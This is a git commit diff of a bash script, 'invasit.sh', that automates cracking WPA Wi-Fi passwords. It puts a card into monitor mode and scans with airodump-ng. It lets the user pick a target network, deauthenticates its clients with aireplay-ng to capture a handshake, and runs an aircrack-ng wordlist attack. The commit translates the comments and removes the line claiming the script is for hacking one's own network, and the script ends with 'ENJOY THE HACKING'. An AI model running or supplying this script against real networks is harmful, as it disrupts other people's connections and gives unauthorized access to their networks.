b0b77fbeb462836bb56b7b2d04df7e7d3fdfb8d4
valvesss <vitoralvesinfo@gmail.com>
2017-09-22 18:27:32 -0300

    Update invasit.sh

--- invasit.sh
+++ invasit.sh
@@ -1,15 +1,13 @@
 #!/bin/bash
 
-# Scrip feito para facilitar o fim educativo de hackear sua própría rede wifi :-).
+# Invasit version 1 || by: valvesss
 
-clear
-
-# EIXO PRINCIPAL
-Principal(){
+# Main
+MAIN(){
 	MONMODE
 }
 
-# 1) Cria placa de rede em modo monitor promíscuo à placa de rede
+# 1) Create NIC mon0
 MONMODE(){
 nic=mon0
 if iwconfig | grep -q $nic ; then
@@ -23,79 +21,79 @@ else
 fi
 }
 
-# 2) Solicita nome do arquivo a ser gerado
+# 2) Ask for the name of all files the will be generated
 SOLARQ(){
 clear
-echo '1) Indique o nome do arquivo a ser gerado:'
-read arquivo
+echo '1) Set the name of the files:'
+read name
 GERTAB
 }
 
-# 3) Gera tabela com todas as redes
+# 3) Generate table with all WPA networks found
 GERTAB(){
-echo "2) Quando encontrar a rede alvo, aperte CTRL+C."
-xterm -title $arquivo -e airodump-ng --encrypt WPA $nic -w $arquivo -o csv
+echo "2) When you find the target network, press CTRL+C."
+xterm -title $name -e airodump-ng --encrypt WPA $nic -w $name -o csv
 clear
 COMDAD
 }
 
-# 4) Compila os dados do airdump
+# 4) Edit airodump output in a human readable way
 COMDAD(){
-cat $arquivo-01.csv | cut -d ',' -f 1,4,14,9 | sed '/Station MAC/,$d' | sed '/^\s*$/d' | sed 's/,//g' | tail -n +2 | nl | awk '{print $1,$5,$2,$3,$4}' | column -t | sed '/ESSID/G' > $arquivo.txt
-rm -rf $arquivo-01.csv
-cat $arquivo.txt
+cat $name-01.csv | cut -d ',' -f 1,4,14,9 | sed '/Station MAC/,$d' | sed '/^\s*$/d' | sed 's/,//g' | tail -n +2 | nl | awk '{print $1,$5,$2,$3,$4}' | column -t | sed '/ESSID/G' > $name.txt
+rm -rf $name-01.csv
+cat $name.txt
 echo ''
-echo '3) Selecione o número da rede que deseja atacar:'
+echo '3) Select the network you want to attack:'
 read num
-bssidalvo=$(cat $arquivo.txt | awk -v aux=$num 'NR==aux {print $3}')
-canal=$(cat $arquivo.txt | awk -v aux=$num 'NR==aux {print $4}')
-nomerede=$(cat $arquivo.txt | awk -v aux=$num 'NR==aux {print $2}')
-rm -rf $arquivo.txt
+bssidtarget=$(cat $name.txt | awk -v aux=$num 'NR==aux {print $3}')
+channel=$(cat $name.txt | awk -v aux=$num 'NR==aux {print $4}')
+networkname=$(cat $name.txt | awk -v aux=$num 'NR==aux {print $2}')
+rm -rf $name.txt
 GERDAD
 }
 
 # 5) Gera dados para capturar o BSSID dos clientes
 GERDAD(){
 clear
-echo '4) Espere listar pelo menos 2 clientes ou mais (abaixo do campo STATION) e então aperte CTRL+C.'
-desejo=1
-	while [ $desejo = 1 ]; do
-		xterm -title $arquivo -e airodump-ng --bssid $bssidalvo -w $arquivo -o csv $nic
-		echo "Deseja executar novamente? [0/1]"
-		read desejo
+echo '4) Wait to list 2 or more client above STATION column and press CTRL+C.'
+aux=1
+	while [ $aux = 1 ]; do
+		xterm -title $name -e airodump-ng --bssid $bssidtarget -w $name -o csv $nic
+		echo "Try again? [0/1]"
+		read aux
 	done
-mac=$arquivo.lst
+mac=$name.lst
 ls
-cat $arquivo-01.csv | awk 'NR==6,NR==10' | awk '{print $1}' | sed 's/,//g' | sed '/^\s*$/d' > $mac
-rm -rf $arquivo-01.csv
+cat $name-01.csv | awk 'NR==6,NR==10' | awk '{print $1}' | sed 's/,//g' | sed '/^\s*$/d' > $mac
+rm -rf $name-01.csv
 HANDSHAKE
 }
 
-# 7) Inicia o processo de captura do handshake
+# 7) Start the handshake capture
 HANDSHAKE(){
-echo "5) Aguarde até que no canto superior direito apareça: WPA Handshake XX:XX:XX:XX:XX:XX"
-xterm -title $arquivo -e airodump-ng -d $bssidalvo -c $canal -w $arquivo -o cap $nic &
+echo "5) Wait until to show: WPA Handshake XX:XX:XX:XX:XX:XX"
+xterm -title $name -e airodump-ng -d $bssidtarget -c $channel -w $name -o cap $nic &
 clear
 nr=$(cat $mac | wc -l)
 i=1
 	while [ $i -le $nr ]; do
-		bssidcliente=$(awk -v var=$i 'NR==var' $mac)
-		xterm -title $arquivo -e aireplay-ng -0 15 -a $bssidalvo -c $bssidcliente $nic --ignore-negative-one
+		bssidclient=$(awk -v var=$i 'NR==var' $mac)
+		xterm -title $name -e aireplay-ng -0 15 -a $bssidtarget -c $bssidclient $nic --ignore-negative-one
 		let i=i+1
 	done
-rm -rf $arquivo.lst
+rm -rf $name.lst
 WORDLIST
 }
 
-# 8) Busca e verificação de erro para o caminho da wordlist
+# 8) Search wordlist and verify if don't exist
 WORDLIST(){
-echo 'Digite o caminho para a wordlist:'
+echo 'Type the wordlist full path:'
 read path
 a=0
 while [ $a -eq 0  ]
 do
 	if [ !  -f $path ]; then
-		echo "Arquivo inexistente, tente novamente."
+		echo "File not found, try again."
 	else
 		a=1
 	fi
@@ -103,20 +101,20 @@ done
 AIRCRACK
 }
 
-# 9) Decriptografando a sennha
+# 9) Decryptograph the password
 AIRCRACK(){
-aircrack-ng $arquivo-01.cap -w $path
+aircrack-ng $name-01.cap -w $path
 FIM
 }
 
-# 10) Reinicia os serviços de rede e exclui a placa de rede virtual criada
+# 10) Reinicialize network services and delete the nic created
 FIM(){
 iw dev $nic del
 service NetworkManager restart
 service networking restart
 clear
 }
-Principal
-echo ##################################
-echo ##	     ENJOY THE HACKING	     ##
-echo ##################################
+MAIN
+echo '####################################'
+echo '##	ENJOY THE HACKING	##'
+echo '####################################'
